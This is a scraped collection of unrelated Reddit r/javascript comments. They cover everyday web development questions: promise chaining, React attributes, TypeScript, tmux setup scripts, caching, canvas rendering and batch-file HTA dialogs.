Doesn't seem worth it. One of the main reasons for js popularity is the fairly low cognitive burden required to understand what's going on. Every piece of new syntax that increases this burden without removing complexity costs *a lot* in the long term. Having "break" statements here and there is a bit pointless but doesn't matter that much in my experience 
Not the hero we wanted... The hero we needed. 
Seems to matter to the rest of the JS community, and you're free to just not use the syntax ¯\\\_(ツ)\_/¯
I wrote a tool to convert a string of text to an address/keypair and tell you if that address contains any BTC. https://www.npmjs.com/package/bitcoin-address-checker
Even if custom attributes without a data prefix are “invalid”, they are still correctly parsed by browsers according to the HTML5 spec. And sometimes having to use them is out of your control if the plugin you're dependent on uses such nonstandard attributes.
OP, go2cinema returns a blank page on chrome for Android right now. Requested desktop site and got the same thing. I am not near a desktop right now or I'd help more. I appreciate you sharing your process and experience! This sort of "how I did it" blogging is useful for you and others to learn from. In that same spirit, I think it would help us all if you could give a post mortem on whatever the root cause is for this blank page load. Also I think it's SEO kosher to make all your site name mentions into links, and would help readers follow to your site. I also think you have an incomplete paragraph toward the end.
Congrats on launching your project/startup.
Yep, and they are even accessible with `element.getAttribute('foo')`, so I'd say that arbitrary attributes are a supported feature because of that. It makes the web flexible. Elements don't have to do anything when you assign arbitrary attributes, but they are useful for storing information, and can be a form of communication between routines that inspect the DOM f.e. Angular reads the DOM, many features of Angular would not work if arbitrary attributes were not allowed. One routine (f.e. PHP on the servierside in this example) can write HTML with arbitrary attributes that instruct another routine (Angular on the client) what to do. It should be just as possible with React: render DOM with react and arbitrary attributes that will instruct another routine (Angular) what to do.
Ah, good thing they've finally started working on allowing any attributes (see response in the link).
Um, you do realize you can use `catch`, which only runs if there's an error? You don't have to use `finally`.
React is essentially javascript with a few extra bells and whistles, but it requires more theory than working directly with the DOM. I would recommend looking into flux architecture first, because eventually you will need it, and it can help when you get into sticky situations. Learncode.academy on Youtube has some good videos on this. I learned React from Tyler McGinnis' tutorial - its a little slow but pretty good and will leave you feeling confident that you can build something from scratch. He recently changed the pricing model to subscriptions (they were insanely expensive a-la-carte before!) But you don't need a paid course to learn, there's a ton of great free material out there. And if it is something that interests you I'd say you're ready. You might hit a few speed bumps, but as long as you are motivated you will figure it out eventually.
Either?
Thanks very much for your so detailed reply.Finally I understand it completely.
ELI5 what does `|&gt;` do?
[removed]
Kill the process externally. (ie: close the browser tab, `pkill -9 nodejs`, pull the machine's power cord, etc.) It seems like I'm being facetious, but if you're relying on a finally clause to send an RPC to a server or clear a lock, it's important to know that a finally clause doesn't **always** execute.
Oh, that's pretty neat. It basically spawns `mshta.exe` with the current file. The important thing to note is that the `mshta.exe` has no access to the calling script, it can only return a value. So the buttons here return a value of 1, 2, or 3 a pop the result into `%HTAreply%`. You would need to switch based on that and do different things based on the result. Something like this should work, after the line that spawns `mshta.exe`: IF "%HTAreply%" == "1" CALL :testFunction1 IF "%HTAreply%" == "2" CALL :testFunction2 IF "%HTAreply%" == "3" CALL :testFunction3 Or, you could also return the function name you intend to call, maybe do something like this: CALL :%HTAreply% And call it via, &lt;button onClick="closeHTA('testFunction1')"&gt;First Option&lt;/button&gt; 
Why use an IIFE at all? I imagine you have something like this (function () { var myvalues = 'whatever' })() Excel.run(function (ctx) { // do some funky excel stuff, but how do i get my values?! }).catch(err =&gt; console.log(err)) In the above example, you can't... myvalues is coped to the IIEF.... you could just.... not do that. Excel.run(function (ctx) { // do some funky excel stuff, now with my values! var myvalues = 'whatever' }).catch(err =&gt; console.log(err)) 
SSR seems so well implemented for react and vue. It is a complete mystery on angular 4. 
Good luck! I hope you're successful. Syntax for partial application would be really awesome.
did you also share this on thenewboston site.
Thank you for the response :) That is basically what I [ended up doing](https://pastebin.com/BtAzyqBk), and it is working great! Now I am trying to figure out how to pass values from the text field I've added to the batch portion (with no luck so far). Like you mentioned, the buttons return a value which can be checked using the %HTAreply%, but the text field..I have no clue 
Ok, well right now you are using `for /F ` https://ss64.com/nt/for_cmd.html This parses out the results of a command, by default each token is accessed from a named variable counting up from what you specify as `%parameter%` -- you can see the statement is currently `set "HTAreply=%%a"` That's not to say you can provide more information to return and parse it out as a different variable. i.e., let's say you return something like this: 1;some extra parameter;another extra parameter And switch up the `for` statement to something like the following: for /F "tokens=* delims=;" %%a in ('mshta.exe "%~F0"') do ( set "Option=%%a" set "Param1=%%b" set "Param2=%%c" if %Option%==1 ( call :testFunction1 ) if %Option%==2 ( call :testFunction2 ) if %Option%==3 ( exit ) ) :testFunction1 echo got option1 with %param% and %param2% Ehh, I'm not sure if that will actually work as written but it should give you some ideas of what is possible with the command.
As others mentioned, this is some sort of factory. Anyhow, that snippet really shouldn't be used as template. It uses an options object, which means the signature won't tell us anything. Either use default values (`constructor(width = 700, height = 300)`) or destructuring with default values (`constructor({width = 700, height = 300} = {})`). The return type of those width/height methods is inconsistent. With zero arguments, you get the width or height back. With one or more arguments, the "chart" function is returned. Consistency is more important than chainability. There is no point in having that pseudo getter/setter boilerplate code if it isn't actually used (apart from enabling chaining). I recommend to just use a class with wannabe-privacy: class Chart { constructor({width = 700, height = 300} = {}) { this._width = width; this._height = height; } } Much simpler, right? You can upgrade to actual privacy once it lands in the language. Alternatively, use the WeakMap workaround if you think it's worth the trouble.
Check out the new release. It includes async command handling, advance command option, command pass through and much more! 
Regarding the blank page, the only scenario you'd get a blank page is if you visit the landing page with JavaScript disabled (or browser old enough to cause a syntax error). Everything else (eg rendering server or router, etc) go down with a fairly detail error page. Whats the android version? Will make sure it is fixed.
I dont understand how this is usefull. Cant I just use fetch together with JSON.parse?
Why does it use promises and callbacks at the same time?
If I understand you correctly you're not so much concerned about hiding the actual data points for the charts, but rather the calculations that give you those data points. Doing it entirely on the client wouldn't be possible, at best you'd maybe be able to deter the not-so-tech-savvy people from finding the algorithm, but anyone who has any idea of what they are doing are going to find it without breaking a sweat. In a case like that I'd watch the sliders for changes (using the [debounce function from the lodash](https://lodash.com/docs/#debounce) library to prevent unnecessary API spam), send the slider values to the server using AJAX, let the server calculate the results and return them, then update the graphs with the new data points. There'd be a slight delay, but it'd offer a relatively better user experience than having to wait for a full page refresh.
No it doesn't? The two callbacks are the usual `onFulfilled` and `onRejected` functions passed to `then`.
Unless I am mistaken, Netlify is just for static pages, i.e. you couldn't really use if with anything dynamic, where content is dependent on user geolocation, etc. Still, looks like a useful project for static pages.
 function fn(){ void skipFinally = false try{ skipFinally = true return 1; }finally{ if (!skipFinally) return 2; } }
Except that while developing you'll run in frontend stuff in debug mode which is extremely heavy compared to optimised production builds.
&gt; 99% people like typescript. At least I haven't yet met anyone who would claim typescript is bad. I wouldn't claim it is bad, but I really dislike it. A ton of bloat with just the illusion of safety. I see the value of static typing in huge software projects with a big team of developers. But most web apps do not fit these characteristics.
You can check the layout into your project, and anyone who checks it out can quickly start it, using the expected interface of interacting with a node project - scripts in package.json. I use terminator, personally, and that can be a pain to set this sort of stuff up with. I might have to check this out.
My bad..
Ok. But why? This is solved problem for years. Besides it's inferior solution because it mixes concerns (fetching file from the network and parsing contents). It doesn't allow for example parsing XML (or other format than JSON). Your solution is even bad in parsing JSON (you don't give possibility for passing reviver parameter to JSON.parse). 
OP appears to be describing a DRM.
That's not a calculator...
Is that a hot dog?
/r/IAmVerySmart And that code is invalid. And are you implying Blac Chyna ain't gold digger? 
Processor speed makes a big difference to me. I make heavy use of my IDE, and it is very CPU-bound. Also, I use code-quality tools with JS that are CPU intensive. An extra GHz of processor speed is significant; since I run a *nix-based OS, I can overclock to the max capacity of the processor. Not sure if you can OC on a Mac~ 
I am wrong. I can replicate thr issue. Unfortunately, I am on my phone and not near a computer. Definetely curious.
Also consider writing a script that starts a tmux session with each command in a pane. It's basically the same idea but infinitely flexible. 
&gt;The code base for client-side code and server-side code started to have little in common, e.g. as in the case of react-server. if they're doing it wrong, what is the "right" way to address this issue?
so is this just a raf-based throttle? there are plenty of existing options for this. i particularly like this tiny one: https://github.com/darsain/raft raf-plus is 12KB [1], while raft is 128B [2] compressed. am i missing something? [1] https://github.com/weiying-shenzhen/raf-plus/blob/master/dist/index.js [2] https://github.com/darsain/raft/blob/master/index.js
They shouldn't have anything in common at all. You don't need to rewrite the same react code for the server to make SSR work, just supply it a server bundle generated by webpack. I'm not sure what is the issue the author referring to.
Hi /u/xDentistBountyHunter, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
Yeah I get a blank page on latest Safari/iPhone too.
Has absolutely nothing to do with any of the tasks involved.
Interesting, I built the exact same app but for iOS, except we used a local neural network to make the recognition instant.
I did that originally, I'm planning to add that back to terminus Maximus when I have some free time
yepp
Not hot dog
Yep. Might as well brag about it being built with CSS and HTML, too.
Hotdog or not hotdog?
The trick is to do something like this in each pane, so you can ctrl-c and start them back up again (rather than SIGINT killing the whole pane): # -d: detached # -c: working dir # -s: session name # -n: window name tmux new-session -d -c "$API" -s "workspace" -n "node" # -h: horizontal tmux split-window -h -c "$FRONTEND" # Run commands tmux send-keys -t "workspace:0.0" 'npm run dev' Enter tmux send-keys -t "workspace:0.1" 'npm run dev' Enter
It's a PHP project with a little but of jQuery and jQueryUI (yuck) code. I think it's off topic here. Plus, can you really distribute someone else's logo like that???
Well, here is the screen shot from the library docs https://github.com/ericwooley/thewooleyway/blob/master/packages/terminus-maximus/docs/ping.png
I tried to turn your GitHub links into [permanent links](https://help.github.com/articles/getting-permanent-links-to-files/) ([press **"y"**](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) to do this yourself): * [ericwooley/thewooleyway/.../**ping.png** (master → 8979a45)](https://github.com/ericwooley/thewooleyway/blob/8979a452e7903ed9e86227b76bd7f238c6fa27b6/packages/terminus-maximus/docs/ping.png) ---- ^(Shoot me a PM if you think I'm doing something wrong.)^( To delete this, click) [^here](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply djzomh5.)^.
Yes, I think you've grasped it. Data points are not as important as algorithm, but still trying to obfuscate them. I would think if someone wanted the algorithm and it wasn't available client-side, accurate data points would be next-best thing. The best place for that would be directly accessing the url returning the ajax request, so it needs protection. An auth key would mitigate that possibility, and further encoding data with a user's key would be even better. But I suspect the decoded data could be "seen" by debugging the client-side js, though a novice could do perhaps. I think all server-side processing is the most 'secure' but least responsive (no-js magic.) All processing on the client side is the least secure but most responsive. That leaves me compromising both in some way. I will certainly look into the function to prevent spamming API. Thanks! 
is it open source ?, I am very much interested to see it
It's just for fun not for any professional use. I open-sourced it so others can replace with their own logos, images &amp; add their own features. And I haven't used jQuery UI.
Awesome! What are the challenges for porting to iOS? I’m pretty new, I thought one of the benefits of React native was allowing for that easy portability. 
The only problem I have is that I don't have a Mac. The code will be same for iOS too. (Changes will only be in external native libraries). I am beginner so started with a very simple app to test features of react native.
I saw it in the source, I may have got it wrong. It's all jQuery plugins though, so not quite cutting edge stuff as far as JS is concerned
That is cool! The problem here is that you have to have tmux installed. Non-node deps is something i am hoping to avoid. Luckily, blessed already has support for this. https://github.com/chjj/blessed#terminal-from-box I just wanted to get the basics working well before I got more fancy.
"hours"
Those plugins you see were created by me only. Yes I too believe code is not that good because I created this project when I was a beginner. Now trying to re-create the same app with MERN stack also Redux, Less &amp; Go!!
The issue has been fixed. The lesson here is do not touch settings that you do not know what they do. The specific setting is "compact" in babelrc configuration. I have set it to true, which basically removed any line breaks from the script, which as I've learned, breaks mobile devices. Thank you for reporting the issue.
Thank you for confirming. Issue resolved – https://www.reddit.com/r/javascript/comments/6m2gzq/prerendering_spa_for_seo_and_improved_perceived/djztgua/.
Ah it also seems to have issues with ad content blockers. (On Safari/iPhone hold the reload button down until the context menu shows providing the option to not block ads.) On a side note, since the web is global, you likely want to detect users that are out of your region (UK?) and give an explanation as to why there are no results. Eg I'm from Canada, but it just says no results... not "sorry this site isn't available in your country yet" type thing
[removed]
[removed]
&gt; A ton of bloat with just the illusion of safety. It's a pretty good illusion. Even if just for documentation, it has been very effective for me. Do I start every small npm package I publish in typescript/flow now? No, but for anything that is going to be developed by more than one person, I think having type definitions for abstractions I am working with insanely helpful.
&gt; On a side note, since the web is global, you likely want to detect users that are out of your region (UK?) and give an explanation as to why there are no results. Eg I'm from Canada, but it just says no results... not "sorry this site isn't available in your country yet" type thing It is the first task for Monday morning. :-) I will add a message saying that we are not serving in your region at the moment with ability to subscribe for updates. There is no short term plan to expand beyond UK... ironically, I have received the most interest about the platform from the movie studios in the US, including some people from WB. The ad blocker is more concerning, as there are no external resources that could be interpreted as ads. What ad blocker on iOS are you using? I am going to test it.
vue is a framework so you get everything you need to really write a big app all nicely tied up in one package. For a beginner who wants to get shit done fast it might be a better choice than react. If you're in it for the longterm, react is a better choice even for a beginner because you can just swap your state management library when you get more experienced.
By the way, if you are still getting the issue, it is most likely cache – the JS resources are using immutable cache instruction which makes it hard to get rid off unless the contents of the bundle changes, which it will not in this case because only the compilation parameters have changed.
flow has a compiler as well-babel. I must admit I prefer flow too. It's just easier to start using on an existing project.
as far as I am aware, ternary expression can span how much programmer wants-example: http://astexplorer.net/#/gist/7dc5bda5deabaf08615a0c50553393ef/394554d7996d70ac2970b2eb73ed209b43b09135 but I prefer to write it like this utilizing extra variables: http://astexplorer.net/#/gist/9572fa01922a19329e5c32e84868377b/31b1f09e63b67ddaddd0b0bcc29a9512d220799c
Oh sure - and if you're just looking to scratch that itch, it's pretty cool working with blessed or react-blessed. For something pragmatic, I'd just install `tmux` or even use `screen`. They're full-featured terminal multiplexers and it would take years of work to reach feature parity; it would never be as fast or lean using Node, either.
Glad you got it fixed! Thanks for the update. I'm not in the UK, but I'll check out the service.
This isn't a caching issue. You're simply overwriting the content (posts list): $(this).parent("div").load($(this).attr('href') + ' #postcontent'); You will need to either load this new content into a container separate from the posts list, or regenerate the posts list (first part of the code you posted) every time you click the original link.
How are you able to generate old API keys from Clarifai? Looks like they transitioned to a single API key (instead of `clarifaiID` and `clarifaiSecret`), I can't see a way to generate the secret required for the `clarifaiSecret` field.
Yes, I get that, I'm pondering the best way to make the clicked data as temporary as possible. I'm thinking the best way is to store the list of links generated from the index in a variable, and put the variable data back into the div if the user does anything (click embedded close icon, click back in browser menu, swipe on mobile, or click open space in the body) other than scroll. That seems to be consistent with what the user should assume. If they go looking for a new post, they will expect to have to refresh, and if they refresh, the variable's data will get updated with a new list.
da fuck is this shit? &gt; learning JS oh
No Babel just strips out the flow syntax. It has a type checker but not its own compiler
Ember FastBoot is one install command and it’s server-side rendered. There’s very little to no change to your code involved.
Just noticed this change. I had the obtained my keys long ago. Will update the app to accept this change.
&gt; I would think if someone wanted the algorithm and it wasn't available client-side, accurate data points would be next-best thing. The best place for that would be directly accessing the url returning the ajax request, so it needs protection. Does it? As long as the data returned is the result of the calculation, rather than the data needed for the calculation, then you should be fine right? &gt; But I suspect the decoded data could be "seen" by debugging the client-side js, though a novice could do perhaps. Yep. There's a mantra I commonly use: "Never trust the client". If you need sensitive information hidden from the client, you do that on the server where you can control it. Obfuscation, encryption, etc.. none of it would work as long as the client has access to whichever method is used to interpret it.
As for the expanding to broader markets that's up to you but if you think it may one day be an option, it may pay well to add to the sorry message an option to sign up for updates when it expands to ${viewersCountry}... eg just to add their email. If/when you do launch say in the US... having a pre-collected isn't if interested emails would be a great way to "organically" grow your audience faster from day one. As for the ad blocker, it is whatever default thing comes with iOS - I just turned it on I don't recall downloading anything. It may not have been the ad blocker now that I think about it... iOS Safari is notorious for aggressively caching and not properly observing reload requests.
Have fun!
&gt; Does it? As long as the data returned is the result of the calculation, rather than the data needed for the calculation, then you should be fine right? It would return an array of data which could be used to recreate algorithm. I've actually successfully done this many times and is somewhat trivial if given enough data points and can determine constants.
Well you could in the mean time apply attributes using vanilla JS to run `componentDidMount` since React doesn't really concern itself with an HTML element's attributes applied outside of anything diffed on HTML relate props like `id`, `className`, `style` etc you can easily do something like this: class ButtonThatDoesThings extends React.PureComponent { componentDidMount() { let { buttonID, someUDID } = this.props document.getElementById(buttonID).setAttribute('udid', someUDID ) } render() { let { buttonID, text } = this.props return &lt;button id={buttonID}&gt;{text}&lt;/button&gt; } }
Whats wrong with that?
So you use the definitions as specs, that's a great solution. I personally like unit tests as specs more (as they define behaviour on top of just input/output).
http://prettydiff.com/guide/unrelated_dom.xhtml With the standard DOM methods you can access any element easily and 2800x faster than using a querySelector. If that isn't good enough you can access absolutely everything with this utility (still hundreds of times faster than a querySelector): https://github.com/prettydiff/getNodesByType/blob/master/getNodesByType.js
I tried to turn your GitHub links into [permanent links](https://help.github.com/articles/getting-permanent-links-to-files/) ([press **"y"**](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) to do this yourself): * [prettydiff/getNodesByType/.../**getNodesByType.js** (master → 774c241)](https://github.com/prettydiff/getNodesByType/blob/774c24130011cde7eca5d4c666226771d5b0aee2/getNodesByType.js) ---- ^(Shoot me a PM if you think I'm doing something wrong.)^( To delete this, click) [^here](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dk033id.)^.
Thank you for the suggestions and the follow up.
True, I could do what React should do, manually, but ideally I want to use React the way it is meant to be used, except with ability to apply any attribute. But good thing it is coming soon!
You can use expo. Doesn't require Xcode 
I highly recommend [got](https://www.npmjs.com/package/got) from the fabulous [sindresorhus](https://www.npmjs.com/~sindresorhus). JSON fetch example: const got = require('got'); got("http://echo.jsontest.com/key/value/one/two", { json: true }) .then(response =&gt; { console.log(response.body); // parsed JSON }); 
For those confused: https://www.youtube.com/watch?v=ACmydtFDTGs
If I can't access it with these CSS selectors and query selector, can I still use that? There's some issue that it works in console but not on the page. I ran into this issue with a frame and I had to use topframe. Something (can't remember...).document. blabla. On some other website. Also I'll look up standard dom methods when I'm on a PC. Totally new to JS. Super appreciate the help. Seriously. 
JS from sites you browse doesn't have access to the filesystem. They do have access to cookies (they won't be logging here) or LocalStorage/IndexedDB (they could be logging stuff here). You can start your search from there.
Wikipedia has a pretty comprehensive list of shortcuts for [bypassing your cache](https://en.wikipedia.org/wiki/Wikipedia:Bypass_your_cache) in different browsers.
In Chrome, with developer tools open (F12), click and hold the reload button. You will be given two extra options for dealing with cache.
mostly caused by javascript
I don't want to bypass the cache, I'd rather just clear it for the specific url (localhost:8080)
Are these files that I can access? Is IndexDB a readable database? Where on a system would I locate them?
I saw there was a disable cache checkbox, refreshed, the page is gone. Interestingly the page doesn't come back up again after unchecking that, I wonder if that clears the cache there as well, thanks!
Chrome has tools for inspecting all of the previously mentioned storage mechanisms for a given URL within its developer tools: https://developers.google.com/web/tools/chrome-devtools/manage-data/local-storage There are also several free extensions in the Chrome store that may make the browsing experience easier (if you don't like the built-in UI). By the way, it's also possible that the chat feature is storing data on a server and loading it when you revisit the site. You could perhaps determine this by looking at the source code or watching the "network" tab (again in developer tools) when you use the chat tool.
Thanks for the reply. I've looked through both the localStorage/sessionsStorage and IndexDB on the page but it is blank. Even if the data is stored on a server and not locally there would have to be data transmitted in order for the words to appear on my screen. In real time I can understand this being in the network tab however I'm looking for historical data. Would that not be cached anywhere in perhaps temporary internet files? I've looked through the chrome files in user/appdata however that doesn't yield anything of use. Any other suggestions? It's possible that this data is lost to me now and I accept that. I'm more curious than anything. Could I perhaps generate some text and check in a cache file/using the dev tool to see it in real time?
You are probably able to access the node from the console and not the JS code because the page is modified sometime between the execution of your JS code and when you run this from the console.
Jaggy, low quality version? You mean like a low res bitmap? Sounds like the canvas resolution doesn't match its size on the page. For example, in your page: &lt;canvas width="640" height="480" style="width:640px;height:480px"&gt;&lt;/canvas&gt; That should ensure the pixels match the canvas size. Then do: renderer = PIXI.autoDetectRenderer(640, 480, {view: document.querySelector('canvas')}) Anyway, point being that the canvas width and height properties determine how many pixels are in it. The style.width and style.height properties determine what size it appears on the page. If they're different, it will scale the pixels. Edit: I should've read more carefully - sounds like you're using a shape rendered to a canvas as a sprite. So it may be that the canvas size used to render the sprite is too small for the size you're using on the display canvas.
Do you have any reference pages or material to follow this problem? Accessing the element was enough of a hurdle, I'd like to learn more about this issue, but I don't even know what to Google. 
Timing is a very real challenge and there isn't a magic bullet to solve this problem. First, let me explain how this works. First of all you are using XHR (AJAX) which is completely asynchronous. This means the XHR is fired synchronously to the rest of your code and you will get some kind of result back eventually, probably long after the rest of your code has finished running. Secondly, DOM access is also completely asynchronous. Each time you attempt to access the DOM the node or manipulation finishes whenever it finishes completely without regard for the timing of your instructions. Finally, the asynchronous nature of XHR transactions is completely unrelated to the asynchronous timings of DOM access. As an added bit of confusion querySelectors include a parse step that is necessary to transform the selector into the standard DOM methods. This parse method largely explains why querySelectors are slower than just using the DOM methods (because you are using them anyways). The confusing part is when this parsing occurs. Does it occur in the browser synchronously before accessing the DOM or does the browser make that parse step an asynchronous part of the DOM access to prevent everything else from slowing down? Who knows. It likely differs, considerably, by browser and would be something very challenging to test. Normally when accessing the DOM I make my access attempts in response to user interaction or callbacks from other user interactions. This way everything is a result of delays imposed by the user and if each asynchronous step occurs in all callback everything fires as fast as it is ready. When you are dealing purely with interactions everything should, generally speaking, be ok with regard to timing. But not everything you will do will be related to interactions from the user. The one time I really had to performance hack the system to account for unknown delays and jump start interactions without the user's knowledge is when I was inject code to mutilate the page for A/B testing. I had to access the DOM at just the right time so that I could make changes before the user noticed, but not before that area of the page was ready. To solve for this problem I had to work out my own timing mechanism. Keep in mind that while writing for A/B testing I owned nothing in the page and it was subject to change at any time. I just had to work around this and be flexible, so bear with me. The web browsers also implement timers in a standard way. These things aren't part of the language but they are there. There is setInterval, which fires code at precise milisecond interval, and there is setTimeout, which is a one time delay. Before I go any further it is necessary to point out that these timers are also asynchronous and their asynchronous nature isn't related to anything mentioned prior. You could just use setInterval and poll the page to see if the DOM is updated as necessary. The problem with this is that everything is asynchronous, which means if your intervals occur too quickly the DOM access from one interval could push into the next interval causing DOM events to curiously queue and stack up. You don't want that and won't be prepared to address it. My technique was to use a recursive setTimeout. Create a function that contains the setTimeout. These timers require two arguments: a function and a delay in miliseconds. That function could be a reference recursively pointing to the very function containing this delay, which creates a loop that works in callback fashion. If you are incredibly new to all this a big comment like this one could be over-whelming, but it points you in the right direction and provides things to Google for.
For future reference, see "formatting help" which says "Lines starting with four spaces are treated like code." Like this: function goldDigger(dating) { var narcissist = ""; if (narcissist === true) { return "Run for the hills!"; } else { return "Good luck!"; } goldDigger(Blac Chyna); // error: function overload, broke internet 
Chat systems generally use WebSockets for communication. WebSocket data is transmitted and received via "messages." It's outside of the specification for these messages to be stored persistently. In other words, if your message history is available somewhere, the developers would have to go out of their way to store it. If they did implement a persistent history, they'd probably give you the opportunity to view the history. Otherwise, it would make no sense to store something and not represent that in the UI. 
Mmm, alright. I'll do some research into this and see what I can do. Thank you for your reply.
Short and sweet, + is the proper way to concatenate strings in Javascript. Strings are immutable in Javascript so creating a new string instance is inevitable. You also have the option of template literals by using backticks. var myString = `search/${firstname}/${lastname}`;
These posts always have the strangest photos to go with them.
the problem is I have the user press a button that is triggers the (function()) script. Is there a way to have a button trigger a script titled with function(ctx)?
*in es6
I am an idiot thank you so much
Yes, it is just a raf-based throttle. But unlike raft, it keeps the same api as window.requestAnimationFrame so it is costless to switch to raf-plus. raf-plus is huge because of two reasons: [1] raf-plus supports umd, which causes additional codes. [2] In order to get O(1) complexity when looking up callback function, raf-plus uses es6's Map and introduces additional polyfill codes. 12KB is huge. I will use Array in next release which will minify the file size down to 500B. Thanks for your notification :) 
Ahhh I didn't know it would come out like that! thank you! 
Hahaha, she's so much so that it broke the function, okay I thought that was funny &gt;_&lt; at least I made myself laugh haha
It's a joke =/
The property "color" in CSS changes the font color. If you want the background to change set the "background-color" to blue
What are the parentheses for?
no clue it was in the template given. This is a countdown timer and i am inputting the date i want
See `document.querySelectorAll`
You should be chaining your promises by returning a promise from within each `then(...)` and continuing with another `then(...)` and finally at the end have a `catch(...)` for all of them. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then#Chaining Also depending on your environment / build process you might want to look into [await](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await).
A few quick suggestions: First, your `catch()` handlers are all doing the same thing - immediately logging out the error. You could define the `(error) =&gt; console.log(error)` function once beforehand, and reuse it each time. (On which note, your very last `catch` clause doesn't actually declare the `error` parameter.) Second, I don't _think_ you need to nest things that way. I believe you can flatten this out considerably by returning the `poll.addCandidatesToSOMETHING()` call results instead. There's a bit of a mantra about how promises work that's helped me and might help you. Whenever you're inside a promise callback, you always do one of three things: 1. Return a value. This resolves the promise immediately. If you don't explicitly `return` anything, the function returns `undefined`, which still resolves the promise now with that value. 2. Throw an error. This rejects the promise immediately. 3. Return a promise. The current promise will resolve or reject when the returned promise resolves or rejects. So, I _think_ this is equivalent and valid: poll.pollForCandidates() .then( candidates =&gt; { let {clientId} = candidates[0]; return poll.getUnprocessedCandidates({context, clientId, candidates}); }) .then( unprocessedCandidates =&gt; { return poll.addCandidatesToQueue(context, unprocessedCandidates); }) .then( processedCandidates =&gt; { return poll.addCandidatesToTable(processedCandidates); }) .then( result =&gt; { console.log(result); }) .catch( error =&gt; { console.log(error); }); Third, you could also use the `async/await` syntax to write that same series of promise steps using more synchronous looking code. If it helps, I have several articles on using Promises in the [ES6 Features](https://github.com/markerikson/react-redux-links/blob/master/es6-features.md#promises) section of my [React/Redux links list](https://github.com/markerikson/react-redux-links).
Yep, parens aren't needed. Edit: and assuming it's not JSON, it won't hurt anything either. It's valid syntax, but I'll effectively do nothing. 
You broke it, not she.
If you want, you can drop the quotes from the property names. They are only need when you have a space or hyphen in the name. 
No, I built it for a class in school. But I'll probably post about it by the end of the summer. It was more than just a recognition app. There was quizzing and a progress tracking feature, along with geolocation.
Sounds cool! 
It's a cool concept, but unfortunately the manpower needed to make it a truly successful app would need more money than just a few college students have.
Yeah! Also theres a difference between a Cool App and app that can earn money! 
It's also severely limited by just nouns, and it's not really how languages are learned. Where I see space for it is when Generative Adversarial Networks really become advanced and can quiz you in realtime on events and predict conversations based on what's going around you.
Great ideas! You should really work on yours. 
Yes, you can make it much flatter by chaining and currying, can end up looking like this - poll.pollForCandidates() .then((candidates) =&gt; { let clientId = candidates[0].clientId; return poll.getUnprocessedCandidates({context, clientId, candidates}) }) .then(log) .then(poll.addCandidatesToQueue(context)) .then(log) .then(poll.addCandidatesToTable) .then(log) .catch(logError)
Theoretically, using += in a loop is equally terrible in JavaScript. However, unlike the JRE, modern JS engines have a workaround for this. They don't actually create the result string right away. They postpone this until you do some sort of read access (e.g. get the length or the nth character, print it, etc). So, if you write some micro benchmark where you don't do anything with the resulting string, the string probably won't even be constructed and your benchmark will actually measure something else. Basically, some sort of StringBuilder is automatically used in JS and you don't really have to worry about it. In new ES6+ code, feel free to use string interpolation. It's a bit less annoying that gluing pieces together with +.
Make sure to use pascal case when setting the styles in Javascript. So background-color would translate to backgroundColor
https://jsfiddle.net/sw4w8qnu/ The fix for yours (line 122): gun.rot = -Math.atan2(mouseX - player.x, mouseY - player.y) + Math.PI * 0.5; Math.PI \* 0.5 is like Tau \* 0.25, which is a quarter turn.
https://jsfiddle.net/1a0stf6m/
This is what it looks like https://screencast.com/t/7VT2IMQd0E I put my attempt in Codepen here: https://codepen.io/a-rts/pen/vZQYML It took a few runs for one of the squares to end up jagged like above when running locally. https://screencast.com/t/mhe2XXsyud But anyway, you should see how jaggy the shapes look when they rotate before they stop moving. This is the Matter.js custom renderer example I mentioned before: https://codepen.io/a-rts/pen/zzMYgb Super smooth, but the renderer is simply a canvas drawing the Matter.Bodies with lines. And a question that should probably come before the attempt - do you think that this is the right way to combine a physics library with a rendering library? To have an object that contains the body and sprite objects? I may be overthinking, but I guess that I will have to create functions that manipulate both at the same time whenever I want to move something in the world or anything? That I am thinking just by looking at the render loop - how the positioning of both the sprite and the physics body need to be managed at the same time. I also wonder if that works correctly in terms of performance too. Edit: I created texture2 from shapes in the original example and it looks jagged too, but the original texture does not look jagged https://codepen.io/a-rts/pen/dRQGeN To swap my graphics texture for the bunny texture to compare, just change between texture and texture2 variables on line 29 in that codepen.
a) Cmd Shift R. b) you can disable caching while the devtools are open in the devtools preferences. 
Thanks!
If I'm to be perfectly honest, I don't know... and I don't have an office license handy to try things out. I took a quick boo at the office docs and found this github repo which seems to detail... a lot of stuff: https://github.com/OfficeDev/Excel-Add-in-WoodGrove-Expense-Trends Maybe this will help? They have a button defined in a task pane: https://github.com/OfficeDev/Excel-Add-in-WoodGrove-Expense-Trends/blob/d4de8c7/WoodGroveExpenseTrends/WoodGroveExpenseTrendsManifest/WoodGroveExpenseTrends.xml#L71-L91 Which has an action that references this: https://github.com/OfficeDev/Excel-Add-in-WoodGrove-Expense-Trends/blob/d4de8c7/WoodGroveExpenseTrendsWeb/App/Home/Home.js#L125-L128 That function includes the `Excel.run` bit.
We used CSS vars extensively when creating PDFs in React via the CSS paged media module. You have to be VERY CAREFUL with them, however, as it's easy to forget that you're basically inserting undebuggable magic global vars.
Just curious, but why Android only since hitting both platforms is one of the biggest perks of React Native? 
can this replace keyframes animations?
The only problem I have is that I don't have a Mac. The code will be same for iOS too. (Changes will only be in external native libraries). I am beginner so started with a very simple app to test features of react native. 
You can use http headers to disable cache on your server: Cache-Control: no-cache, no-store, must-revalidate Pragma: no-cache Expires: 0
I pretty much doubt it.
and you can try to read about async/await, which is syntactic sugar for this https://ponyfoo.com/articles/understanding-javascript-async-await
What's the advantage to just using js vars?
I'd have thought you have the body and sprite in separate instances as resolutions of each should be on differing scales. The guys at WhitestormJS should have some examples on Physics integration to an existing 3D engine. 
thnx!! 
https://xkcd.com/927/
